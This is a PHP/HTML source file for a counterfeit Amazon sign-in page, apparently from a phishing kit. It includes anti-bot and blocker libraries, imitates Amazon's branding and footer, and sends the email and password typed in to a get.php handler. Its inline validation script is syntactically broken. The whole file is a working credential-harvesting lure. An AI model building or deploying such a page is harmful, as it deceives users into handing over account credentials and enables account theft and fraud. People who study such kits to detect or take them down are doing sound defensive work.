<?php 
  include './lib/loca.php';
  include './lib/browser.php';
  include './lib/system.php';
  include './lib/blocker.php';
  include './lib/antibots4.php';
?>

<html>
<head>
<title>Amazon - Login to your account </title>
<link rel='icon' href='./img/icon.png'>
<link rel='stylesheet' href='./css/login.css'>
<script src='./js/q.js'></script>
<script src='./js/v.js'></script>
<meta charset='utf-8'>
<meta name='viewport' content='width=device-width' />
</head>
<body>
<center>
 
<br>
<img class='img2' src='./img/logo.png'></img>
<br><br>
<div class='boxlogin'>

<form action='get.php' method='post' name='login' id='login'>
<h2>Sign in</h2>
<b style='font-size:0.8em;'>Email (phone for mobile accounts) </b>
<input type="text" required name="email" class="text" title='enter your email' id='email'>
<b style='font-size:0.8em;'>Password </b>
<input type="password" required  name="password" class="text" title='enter your password'>
<input type='submit' class='button' name='login' value='Sign in'>
<br><br>
<a href='#' style='font-size:0.8em;'>Need help? </a>
</form>
<script>

$().ready(function() {
	var validator = $("#login").validate({
			$( element )
				.closest( "form" )
					.find( "label[for='" + element.attr( "id" ) + "']" )
						.append( error );
		},
		errorElement: "span" 

	});
});

</script>
</div>
<br><br>
<div style='font-size:0.6em;'>
<a href="#" style='margin-right:16px;'> Conditions of Use </a>
<a href='#' style='margin-right:16px;'>Privacy Notice </a>
<a href='#' style='margin-right:16px;'>Help </a>
<br><br>
© 1996-2018, Amazon.com, Inc. or its affiliates 
</div>
</center>
</body>
</html>